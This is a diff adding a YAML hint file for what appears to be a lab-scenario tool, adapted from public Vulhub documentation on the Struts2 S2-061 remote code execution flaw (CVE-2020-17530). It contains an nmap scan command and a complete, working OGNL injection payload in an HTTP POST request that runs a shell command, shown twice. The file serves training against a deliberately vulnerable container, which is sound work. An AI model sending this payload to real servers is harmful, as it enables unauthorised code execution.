@@ -1,0 +1,103 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-061
+cve: CVE-2020-17530
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/`.'
+  high:
+  - |-
+    Vulnerability: Struts2 S2-061 Remote Code Execution Vulnerablity (CVE-2020-17530).
+
+    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2020-17530
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    Send the following request to execute the `id` command:
+
+    ```
+    POST /index.action HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+    Content-Disposition: form-data; name="id"
+
+    %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+    ```
+
+    It can be seen that the result of the `id` command will be displayed on the page:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-061/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-061/README.md'
+  - |-
+    Additional public references:
+    - https://cwiki.apache.org/confluence/display/WW/S2-061
+    - https://github.com/ka1n4t/CVE-2020-17530
+    - https://www.anquanke.com/post/id/225252
+    - https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g
+access_instructions:
+  title: Struts2 S2-061 Remote Code Execution Vulnerablity (CVE-2020-17530)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/`.
+  - title: Exploit
+    instructions: |-
+      Send the following request to execute the `id` command:
+
+      ```
+      POST /index.action HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+      Connection: close
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+
+      ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+      Content-Disposition: form-data; name="id"
+
+      %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+      ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+      ```
+
+      It can be seen that the result of the `id` command will be displayed on the page:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-061/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-061/README.md
+  readme_sha256: c40d77e7c818f696e19ef5c4cd7ce5215bc0c7029fa9e4f8fa3711e8a27dab45
+  compose_sha256: 219b89d24d4ac2167586a2cc52df0654d2a50ab2bcc47bff6d5cbce1b09223ce
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
